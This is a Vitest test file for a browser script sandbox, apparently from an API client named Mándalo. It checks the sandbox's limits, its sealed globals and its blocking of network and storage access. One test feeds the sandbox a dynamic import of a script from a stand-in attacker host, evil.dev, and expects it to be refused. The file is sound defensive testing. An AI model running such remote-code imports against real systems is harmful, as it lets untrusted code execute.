import { afterAll, beforeAll, describe, expect, it } from "vitest";
import scriptRs from "../../../crates/core/src/script.rs?raw";
import preludeGenerated from "../../../editor-extension/src/engine/prelude.generated.ts?raw";
import { LIMITS } from "./limits.generated";
import { EXTRA_SEALED, readBlocked, readLimits } from "./sandboxSource.mjs";
import { webExecuteScript } from "./script";
import { generatedWorkerSource, useGeneratedWorker } from "./worker.testkit";

let restoreWorker: () => void;

beforeAll(() => {
  restoreWorker = useGeneratedWorker();
});

afterAll(() => {
  restoreWorker();
});

function context() {
  return {
    vars: {},
    requestName: "sandbox",
    request: { method: "GET", url: "https://a.dev", headers: [] as [string, string][], body: null },
    response: null,
  };
}

describe("the browser sandbox is the Rust sandbox", () => {
  it("takes its limits from crates/core rather than a number typed here", () => {
    expect(LIMITS).toEqual(readLimits(scriptRs));
    expect(LIMITS.timeoutMs).toBeGreaterThan(0);
  });

  it("seals every global Rust blocks", () => {
    const worker = generatedWorkerSource();
    for (const [name] of readBlocked(scriptRs))
      expect(worker, `${name} is not sealed in the browser worker`).toContain(`"${name}"`);
  });

  it("seals the same extra globals the extension's worker seals", () => {
    const worker = generatedWorkerSource();
    for (const [name] of EXTRA_SEALED) {
      expect(worker, `${name} is not sealed in the browser worker`).toContain(`"${name}"`);
      expect(preludeGenerated, `${name} is not sealed in the extension worker`).toContain(
        `"${name}"`,
      );
    }
    // The four the browser worker used to be missing, named so a silent removal shows up.
    for (const name of ["WebAssembly", "BroadcastChannel", "MessageChannel", "MessagePort"])
      expect(EXTRA_SEALED.map(([sealed]) => sealed)).toContain(name);
  });
});

describe("what a script cannot reach", () => {
  it("refuses a dynamic import instead of letting it run out the clock", async () => {
    await expect(
      webExecuteScript('await import("https://evil.dev/x.js");', context()),
    ).rejects.toThrow(/import\(\) is not available in Mándalo scripts/);

    await expect(
      webExecuteScript('Promise.resolve().then(() => import ("x"));', context()),
    ).rejects.toThrow(/import\(\) is not available in Mándalo scripts/);

    await expect(webExecuteScript("pm.variables.set('m', import.meta.url);", context())).rejects.toThrow(
      /import\(\) is not available in Mándalo scripts/,
    );
  });

  it("still runs a script that only mentions the word import", async () => {
    const outcome = await webExecuteScript(
      'pm.variables.set("important", "yes"); pm.variables.set("a", pm.variables.get("important"));',
      context(),
    );

    expect(outcome.varSets["a"]).toBe("yes");
  });

  it("names the blocked global when a script reaches for one", async () => {
    await expect(webExecuteScript('fetch("https://a.dev")', context())).rejects.toThrow(
      /fetch is not available in Mándalo scripts: scripts cannot make network requests/,
    );
    await expect(webExecuteScript("indexedDB.open('x')", context())).rejects.toThrow(
      /indexedDB is not available in Mándalo scripts/,
    );
  });

  it("stops a script that never returns, at the limit Rust sets", async () => {
    const started = Date.now();
    await expect(webExecuteScript("for (;;) {}", context())).rejects.toThrow(
      `script exceeded ${LIMITS.timeoutMs}ms`,
    );
    expect(Date.now() - started).toBeLessThan(LIMITS.timeoutMs * 4);
  }, 30_000);
});
